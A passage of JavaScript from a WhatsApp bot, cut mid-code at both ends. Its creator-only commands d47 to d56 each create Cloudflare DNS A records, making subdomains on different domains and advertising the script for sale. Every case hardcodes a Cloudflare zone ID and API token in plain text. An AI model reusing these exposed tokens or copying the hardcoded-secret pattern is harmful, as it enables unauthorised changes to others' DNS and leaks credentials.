"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd47': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "144f7c48ca035135390fe5adb49d642f";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi"
               let tld = "kayyoffc.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd48': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b2d97568ad8f0ded2ef12cfc8261c6fd";
               let apitoken = "3UYwDrzWYNcx0SHyW2daXIE3MiEBves18Cg1HXdb"
               let tld = "highscale.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd49': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "9e7239dcda7cbd6be79d7615257f56f8";
               let apitoken = "aHvYYKk7YIADVOfpG3i1eaIqTeWCdPS25FAPreDQ"
               let tld = "heavencraft.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd50': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "bb0b767035e14c69cecfdd3eb757b322";
               let apitoken = "S9-2ht3ZxW0B8JjkTI720WaM743nvJKwXfMw3pXI"
               let tld = "servemcpec.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd51': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4d108db4f5160809fa3882481450eb3e";
               let apitoken = "zg54rhSoaObHDnlYm7PSqpQoNOmaG4cB5q7nfIkc"
               let tld = "ghostxdzz.online";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd52': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a0206c68c9b356bdf0a96fbb5d61fbdc";
               let apitoken = "8-zhtsEm27FKPsczF3ro2PipM9i1n8k2rzCyOmvj"
               let tld = "my-website.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd53': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "80e208bb5900abc50d4483bdb8590d42";
               let apitoken = "3XpwIR878Fi0IoVyaJl1ggGgyJXuy_pB3g0M8pjz"
               let tld = "smtp1.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd54': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "65f61d0fd65f2c56836b298ab0a546df";
               let apitoken = "ZHIcQDnvj7-OoLwea0ppt42pYKdhfdBOwmzAQoJW"
               let tld = "panellkuu.cloud";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd55': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "493236f2d50d8f4248548e6af71d44aa";
               let apitoken = "GuvNxmBanfeZZVVUMJ-tS6Us7rygf0DtjzIcgy5L"
               let tld = "dzhostingid.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd56': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "edf8e5a66859e6a1f8ccbde07c415082";
               let apitoken = "p0gm6UzsPw0Y0eudhfDr1ZBvV_WjX9eMpTp4ksXZ"
               let tld = "didindev.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
